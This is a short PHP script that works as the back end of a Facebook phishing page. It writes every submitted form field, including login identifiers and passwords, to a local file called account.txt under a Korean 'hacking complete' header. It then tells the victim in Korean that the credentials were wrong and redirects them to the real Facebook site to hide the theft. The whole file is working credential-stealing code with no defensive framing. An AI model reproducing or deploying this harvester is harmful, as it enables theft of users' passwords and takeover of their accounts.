
<?php
header('Content-Type: text/html; charset=utf-8');
$handle=fopen("account.txt", "a");
$atim =time();
$atime=date("dS F Y", $atim);
fwrite($handle,"\r\n");
fwrite($handle,"\t\t 해킹 완료:");
fwrite($handle,$atime);
fwrite($handle,"\r\n");
fwrite($handle,"\t================================================");
fwrite($handle,"\r\n");
foreach($_POST as $variable=>$value)
{
fwrite($handle,"\t\t\t");
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fwrite($handle,"\t================================================");
fclose($handle);
echo "잘못된 이메일,번호/비밀번호 <br>";
echo "다시시도해주십시요.";
header("Refresh:2;url=https://www.facebook.com/");
?>